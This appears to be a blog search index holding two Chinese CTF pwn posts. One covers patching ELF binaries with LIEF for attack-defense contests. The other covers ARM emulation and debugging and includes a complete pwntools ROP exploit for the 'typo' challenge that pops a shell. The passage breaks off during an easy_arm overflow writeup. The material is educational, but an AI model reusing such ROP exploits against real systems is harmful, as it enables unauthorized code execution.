<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Pwn patch method</title>
      <link href="/2019/07/20/pwn-patch-method/"/>
      <url>/2019/07/20/pwn-patch-method/</url>
      <content type="html"><![CDATA[<p><em>国赛半决赛的时候需要fix，因为没有做太多准备，第一天直接用的ida，第二天用的keypatch插件，但是效果都不是太好，感觉很水，所以单独学习一下</em></p><h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><h2 id="keypatch"><a href="#keypatch" class="headerlink" title="keypatch"></a>keypatch</h2><p>说到patch容易看到的一款ida的插件了，用法倒是很简单，<br><a href="https://github.com/keystone-engine/keypatch" target="_blank" rel="noopener">https://github.com/keystone-engine/keypatch</a> 下载完毕后放到ida的插件目录下重启ida就ok了</p><h2 id="lief"><a href="#lief" class="headerlink" title="lief"></a>lief</h2><p>刚发现的一款神器，可以对elf，pe等多种格式的文件进行修改<br>python 使用直接pip安装即可</p><h1 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h1><p>这里主要使用lief</p><h2 id="直接修改库的函数"><a href="#直接修改库的函数" class="headerlink" title="直接修改库的函数"></a>直接修改库的函数</h2><p>如果程序使用了system来getshell，如果是已经动态链接的话，实际上是可以将它给改为其他函数的</p><p>测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">    return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果是正常的程序，运行就可以直接拿到shell</p><p>我们编写一份patch.py，就是简单的将system换为puts</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import lief</span><br><span class="line"></span><br><span class="line">bin = lief.parse(&apos;main&apos;)</span><br><span class="line">system_off = filter(lambda e:e.name == &quot;system&quot;,bin.imported_symbols)[0]</span><br><span class="line">system_off.name = &quot;puts&quot;</span><br><span class="line">bin.write(&quot;main_patch&quot;)</span><br></pre></td></tr></table></figure><p>效果展示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/test/test2$ ./main</span><br><span class="line">$ ls</span><br><span class="line">main  main.c  main_patch  patch.py </span><br><span class="line">$ </span><br><span class="line">sirius@ubuntu:~/tikool/test/test2$ python patch.py </span><br><span class="line">done</span><br><span class="line">sirius@ubuntu:~/tikool/test/test2$ ./main_patch </span><br><span class="line">/bin/sh</span><br><span class="line">sirius@ubuntu:~/tikool/test/test2$</span><br></pre></td></tr></table></figure><h2 id="修改导入库的函数"><a href="#修改导入库的函数" class="headerlink" title="修改导入库的函数"></a>修改导入库的函数</h2><p>这里就跟着lief的官方文档来进行实验</p><p>主程序，会调用exp函数求e的n次幂<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//gcc main.c -o main -lm</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    if (argc != 2) &#123;</span><br><span class="line">        printf(&quot;Usage: %s &lt;a&gt; \n&quot;, argv[0]);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    double a = atoi(argv[1]);</span><br><span class="line">    printf(&quot;exp(%lf) = %lf\n&quot;, a, exp(a));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因为该函数是在libm.so.6中，我们将其复制到当前目录，编写hook，生成库</p><p>这里hook函数用来计算平方值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span><br><span class="line">double hook(double x)&#123;</span><br><span class="line">        return x*x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写patch.py，这里是在libm中新添加了一个段来添加后面新加的exp函数，最后将其写入libm.so.6</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import lief</span><br><span class="line"></span><br><span class="line">main = lief.parse(&apos;main&apos;)</span><br><span class="line">libm = lief.parse(&apos;libm.so.6&apos;)</span><br><span class="line">hook = lief.parse(&apos;hook&apos;)</span><br><span class="line"></span><br><span class="line">segment_add = libm.add(hook.segments[0])</span><br><span class="line">print &quot;hook inserted at VA: 0x&#123;:06x&#125;&quot;.format(segment_add.virtual_address)</span><br><span class="line"></span><br><span class="line">exp_symbol = libm.get_symbol(&quot;exp&quot;)</span><br><span class="line">hook_symbol = hook.get_symbol(&quot;hook&quot;)</span><br><span class="line">exp_symbol.value = segment_add.virtual_address + hook_symbol.value</span><br><span class="line"></span><br><span class="line">libm.write(&quot;libm.so.6&quot;)</span><br></pre></td></tr></table></figure><p>查看效果，因为默认使用的是系统库，所以正常，优先使用当前目录的库时，原来的exp变为平方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/test/test3$ ldd main</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007ffff7ace000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7704000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)</span><br><span class="line">sirius@ubuntu:~/tikool/test/test3$ ./main  2</span><br><span class="line">expl(2.000000) = 7.389056</span><br><span class="line">sirius@ubuntu:~/tikool/test/test3$ LD_LIBRARY_PATH=. ldd main</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffa000)</span><br><span class="line">libm.so.6 =&gt; ./libm.so.6 (0x00007fffb7cbb000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fffb78f1000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd7000)</span><br><span class="line">sirius@ubuntu:~/tikool/test/test3$ LD_LIBRARY_PATH=. ./main 2</span><br><span class="line">expl(2.000000) = 4.000000</span><br></pre></td></tr></table></figure><h2 id="特定地址函数patch"><a href="#特定地址函数patch" class="headerlink" title="特定地址函数patch"></a>特定地址函数patch</h2><p>例如UAF漏洞经常会结合其他漏洞一块存在，如果可以对free进行修补则可以在一定程度上对其进行维护</p><p>这里使用别的函数进行演示</p><p>主程序，就是两次输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">        int a=2;</span><br><span class="line">        printf(&quot;%d\n&quot;,a);</span><br><span class="line">        printf(&quot;%d\n&quot;,a);</span><br><span class="line">        return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>目标是将第一个printf修改成我们自己写的比如说write函数，将其使用汇编进行编写为hook</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//gcc -Os -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</span><br><span class="line">void myprintf(char *a,int b)&#123;</span><br><span class="line">        asm(</span><br><span class="line">                &quot;mov %rdi,%rsi\n&quot;</span><br><span class="line">                &quot;mov $0,%rdi\n&quot;</span><br><span class="line">                &quot;mov $0x20,%rdx\n&quot;</span><br><span class="line">                &quot;mov $0x1,%rax\n&quot;</span><br><span class="line">                &quot;syscall\n&quot;</span><br><span class="line">                );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编查看第一次printf的调用地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">40053f:89 c6                mov    esi,eax</span><br><span class="line">400541:bf f4 05 40 00       mov    edi,0x4005f4</span><br><span class="line">400546:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">40054b:e8 b0 fe ff ff       call   400400 &lt;printf@plt&gt;</span><br><span class="line">400550:8b 45 fc             mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">400553:89 c6                mov    esi,eax</span><br><span class="line">400555:bf f4 05 40 00       mov    edi,0x4005f4</span><br><span class="line">40055a:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">40055f:e8 9c fe ff ff       call   400400 &lt;printf@plt&gt;</span><br></pre></td></tr></table></figure></p><p>编写patch.py 这里是先将myprintf添加到main程序中，再修改函数调用部分为我们的myprintf_addr</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import lief</span><br><span class="line"></span><br><span class="line">def patch_call(file,where,end,arch=&apos;amd64&apos;):</span><br><span class="line">    length = p32((end-(where+5))&amp;0xffffffff)</span><br><span class="line">    order = &apos;\xe8&apos;+length</span><br><span class="line">    print disasm(order,arch=arch)</span><br><span class="line">    file.patch_address(where,[ord(i) for i in order])</span><br><span class="line">    file.write(&quot;main_patch&quot;)</span><br><span class="line"></span><br><span class="line">binary = lief.parse(&apos;main&apos;)</span><br><span class="line">hook = lief.parse(&apos;hook&apos;)</span><br><span class="line">segment_add = binary.add(hook.segments[0])</span><br><span class="line"></span><br><span class="line">myprintf = hook.get_symbol(&quot;myprintf&quot;)</span><br><span class="line">myprintf_addr =  myprintf.value + segment_add.virtual_address</span><br><span class="line"></span><br><span class="line">patch_addr = 0x400584</span><br><span class="line">patch_call(binary,patch_addr,myprintf_addr)</span><br><span class="line">binary.write(&quot;main_patch&quot;)</span><br></pre></td></tr></table></figure><p>测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/test/test1$ ./main</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">sirius@ubuntu:~/tikool/test/test1$ python patch.py </span><br><span class="line">0x802000</span><br><span class="line">   0:   e8 8a 1d 40 00          call   0x401d8f</span><br><span class="line">sirius@ubuntu:~/tikool/test/test1$ ./main_patch </span><br><span class="line">%d</span><br><span class="line">;4�����8���P2</span><br></pre></td></tr></table></figure></p><p>效果很明显，但是看不出来第二个printf是否被影响了，查看反汇编确定修改成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">40053f:89 c6                mov    esi,eax</span><br><span class="line">400541:bf f4 05 40 00       mov    edi,0x4005f4</span><br><span class="line">400546:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">40054b:e8 8a 1d 40 00       call   8022da &lt;_end+0x20129a&gt;</span><br><span class="line">400550:8b 45 fc             mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">400553:89 c6                mov    esi,eax</span><br><span class="line">400555:bf f4 05 40 00       mov    edi,0x4005f4</span><br><span class="line">40055a:b8 00 00 00 00       mov    eax,0x0</span><br><span class="line">40055f:e8 9c fe ff ff       call   400400 &lt;printf@plt&gt;</span><br></pre></td></tr></table></figure><h2 id="直接修改got表"><a href="#直接修改got表" class="headerlink" title="直接修改got表"></a>直接修改got表</h2><p>这里我还不太确定其内部实际上与第一种是否相同</p><p>仍然使用第三次的程序，直接上patch.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import lief</span><br><span class="line"></span><br><span class="line">binary = lief.parse(&apos;main&apos;)</span><br><span class="line">hook = lief.parse(&apos;hook&apos;)</span><br><span class="line">segment_add = binary.add(hook.segments[0])</span><br><span class="line"></span><br><span class="line">myprintf = hook.get_symbol(&quot;myprintf&quot;)</span><br><span class="line">myprintf_addr =  myprintf.value + segment_add.virtual_address</span><br><span class="line">binary.patch_pltgot(&apos;printf&apos;,myprintf_addr)</span><br><span class="line"></span><br><span class="line">binary.write(&quot;main_patch&quot;)</span><br></pre></td></tr></table></figure><p>这里就是对printf的调用修改成了自定义的myprintf</p><p>测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/test/test1$ ./main_patch </span><br><span class="line">%d</span><br><span class="line">;4�����8���P%d</span><br><span class="line">;4�����8���P</span><br></pre></td></tr></table></figure></p><p>查看反汇编发现与修改前一致，应该是直接对got表进行了修改</p><h1 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h1><p>这个lief比较好用，就写了个小工具来方便patch，现在只有一个简单点指定地址长度的nop与针对UAF漏洞的free函数的patch2<br>如果需要的话看这里<a href="https://github.com/siriuswhiter/ELF-Patcher" target="_blank" rel="noopener">https://github.com/siriuswhiter/ELF-Patcher</a></p><p>需要提醒的是UAF的patch2是不能直接将其patch完成的，因为函数调用的姿势经常不尽相同，需要根据call free之前参数的传递方式来进行修改判断是否需要迁移代码。<br>如果运气比较好像这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000E64                 lea     rdx, ds:0[rax*8]</span><br><span class="line">.text:0000000000000E6C                 lea     rax, unk_202060</span><br><span class="line">.text:0000000000000E73                 mov     rax, [rdx+rax]</span><br><span class="line">.text:0000000000000E77                 mov     rax, [rax]</span><br><span class="line">.text:0000000000000E7A                 mov     rdi, rax        ; ptr</span><br><span class="line">.text:0000000000000E7D                 call    _free</span><br></pre></td></tr></table></figure></p><p>就完全不需要迁移，将0xE77 nop 掉就可以将指向ptr的指针传参进去了</p><p>而像下面这种，就需要进行部分迁移了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040094A                 push    rbp</span><br><span class="line">.text:000000000040094B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040094E                 mov     rax, cs:buf</span><br><span class="line">.text:0000000000400955                 mov     rdi, rax        ; ptr</span><br><span class="line">.text:0000000000400958                 call    _free</span><br><span class="line">.text:000000000040095D                 lea     rdi, aDone      ; &quot;Done!&quot;</span><br></pre></td></tr></table></figure></p><p>在使用时选择migration，指定起始地址为0x400955，结束地址为0x40095d，就可以将这两行进行迁移，<br>之后在IDA中将 mov  rax, cs:buf 改为 lea  rax, cs:buf 取地址即可</p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Arm-pwn 环境搭建及示例</title>
      <link href="/2019/07/13/arm-pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E7%A4%BA%E4%BE%8B/"/>
      <url>/2019/07/13/arm-pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E7%A4%BA%E4%BE%8B/</url>
      <content type="html"><![CDATA[<p><em>为了搭建这个环境费了好多心思，也花了好久好久~~~，网上的教程大多都是arm的板子的调试，最后终于找到了简单合适的办法</em></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>在已经有了gdb ，pwntools等之前pwn需要的环境下来进行下面的搭建</p><ol><li><p>安装gdb-multiarch</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure></li><li><p>安装qemu，这个倒是不论在什么教程里都一定会有的，模拟跨平台神器，这里貌似只要安装qemu-user就可以了<br>binfmt*是用来识别文件类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br><span class="line">sudo apt-get install qemu-user-binfmt</span><br><span class="line">sudo apt-get install &quot;binfmt*&quot;</span><br></pre></td></tr></table></figure></li></ol><p>只用这两步就可以直接运行静态链接的arm程序，尝试打开jarvisoj的typo，正常运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/arm-test$ file typo</span><br><span class="line">typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped</span><br><span class="line">sirius@ubuntu:~/tikool/arm-test$ ./typo </span><br><span class="line">Let&apos;s Do Some Typing Exercise~</span><br><span class="line">Press Enter to get start;</span><br><span class="line">Input ~ if you want to quit</span><br><span class="line"></span><br><span class="line">------Begin------</span><br><span class="line">sour</span><br></pre></td></tr></table></figure></p><ol start="3"><li>下一步是为了能够运行动态链接的跨平台如arm的程序的</li></ol><p>查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search  &quot;libc6-&quot; | grep &apos;arm&apos;</span><br></pre></td></tr></table></figure></p><p>或利用tab补全来查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libc6-*</span><br></pre></td></tr></table></figure></p><p>在其中寻找所需的架构对应的库，比如arm32用的是这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libc6-armel-cross</span><br></pre></td></tr></table></figure></p><ol start="4"><li>运行方式，-L 指定运行库，-g 指定端口<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /usr/arm-linux-gnueabi  ./ciscn_2019_en_1</span><br></pre></td></tr></table></figure></li></ol><p><em>arm（大端）和armel（小端）区别在于存储方式，一个是大端（低序存在高地址，按顺序来），一个是小端序（将低序的存在低地址，反常识来）。其他如mips同理</em></p><p>这里使用信安大赛华北赛区的一道arm题来测试，不加参数-g可以直接运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sirius@ubuntu:~/tikool/arm-test$ file ciscn_2019_en_1 </span><br><span class="line">ciscn_2019_en_1: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=1aaea66452d1dc8a477419b71a3ebaaad001ada1, stripped</span><br><span class="line">sirius@ubuntu:~/tikool/arm-test$ qemu-arm -L /usr/arm-linux-gnueabi  ./ciscn_2019_en_1 </span><br><span class="line">your name:</span><br><span class="line"></span><br><span class="line">aaaaaaaa</span><br><span class="line">hello aaaaaaaa</span><br></pre></td></tr></table></figure></p><ol start="5"><li>调试，之前一直就是调试这里搭不好，这里不需要用gdbserver。。</li></ol><p>首先让程序按上面的步骤在一个端口比如说1234跑起来，然后在另一边使用gdb-multiarch进行调试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch  pwnname</span><br></pre></td></tr></table></figure></p><p>进入gdb后 set architecture 设置架构（据说一般都会自动识别成功，不用设置），然后target remote ip:port 远程连接</p><p>测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br></pre></td></tr></table></figure></p><ol start="6"><li>脚本调试</li></ol><p>使用socat在本地运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-l:10002,fork exec:&quot;qemu-arm -g 1234 -L /usr/arm-linux-gnueabi  ./pwn&quot;;reuseaddr</span><br></pre></td></tr></table></figure></p><p>脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remote 127.0.0.1:10002</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure></p><p>这里将pause相当于断点，pause之后再开窗口打开gdb-multiarch进行调试，这样还是有点麻烦，但是现在不知道有什么好办法。</p><h1 id="关于ARM"><a href="#关于ARM" class="headerlink" title="关于ARM"></a>关于ARM</h1><p>参考：<a href="https://www.jianshu.com/p/bd96a8f58cbd" target="_blank" rel="noopener">https://www.jianshu.com/p/bd96a8f58cbd</a></p><figure class="image-box">                <img src="/2019/07/13/arm-pwn-环境搭建及示例/ARM_Calling_Convention.png" alt="arm''" title="" class="">                <p>arm''</p>            </figure><p>r0 - r3 存放参数 1-4 ，其余参数从右到左入栈； </p><p>被调用者实现栈平衡； </p><p>返回值存放在r0</p><p>R13 相当于栈指针ESP/RSP</p><p>PC 相当于EIP/RIP指针<br>LR link register 保存返回地址的寄存器</p><p>BL 相当于call ， 跳转并把返回值保存到LR中<br>B 相当于jmp<br>BX 跳转并切换状态 ARM 与THUMB 指令<br>BLX  带返回的跳转并切换状态</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>静态链接，简单的ROP，但是arm的看起来没那么熟悉；开启栈不可执行保护，其他没开</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先找下gadget，因为被strip了，没有了符号表，所以system无法直接找到<br>说是用rizzo可以恢复部分符号<br>因为要传一个参数，所以可以找下r0</p><ul><li>关于导入符号表</li></ul><p>先把导入的libc文件拿出来,使用rizzo导出为.riz文件</p><figure class="image-box">                <img src="/2019/07/13/arm-pwn-环境搭建及示例/export.png" alt="导出" title="" class="">                <p>导出</p>            </figure><p>再把riz导入文件</p><figure class="image-box">                <img src="/2019/07/13/arm-pwn-环境搭建及示例/import.png" alt="导入" title="" class="">                <p>导入</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary typo --only &apos;pop&apos; | grep r0</span><br><span class="line">0x00020904 : pop &#123;r0, r4, pc&#125;</span><br></pre></td></tr></table></figure><p>里面刚好还要pc，前面已经指定pc是相当于eip指针，所以这里可以顺便把system pop到 pc</p><p>关于偏移，理论上是可以用pwntools的cyclic，但是在arm程序里运行的不太对，不知道哪里出错了，只能爆破一下得到偏移</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.binary = &apos;typo&apos;</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process([&apos;qemu-arm&apos;, &apos;-L&apos;, &apos;/usr/arm-linux-gnueabi&apos;, &apos;typo&apos;])</span><br><span class="line">elf = ELF(&apos;./typo&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;127.0.01&apos;,&apos;10002&apos;)</span><br><span class="line">elf = ELF(&apos;./typo&apos;)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">pop_r0_r4_pc = 0x00020904</span><br><span class="line">system = 0x110b4</span><br><span class="line">binsh = 0x6c384</span><br><span class="line">pay = &apos;a&apos;*112+p32(pop_r0_r4_pc)+p32(binsh)*2+p32(system)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&quot;&quot;)</span><br><span class="line">#pause()</span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(pay)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-arm"><a href="#easy-arm" class="headerlink" title="easy_arm"></a>easy_arm</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>半决赛的题。。因为是arm的大部分就没做出来。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">signed int vul()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [sp+0h] [bp-24h]</span><br><span class="line"></span><br><span class="line">  setup();</span><br><span class="line">  puts(&quot;your name:\n&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x100u);</span><br><span class="line">  printf(&quot;hello %s\n&quot;, &amp;buf);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" 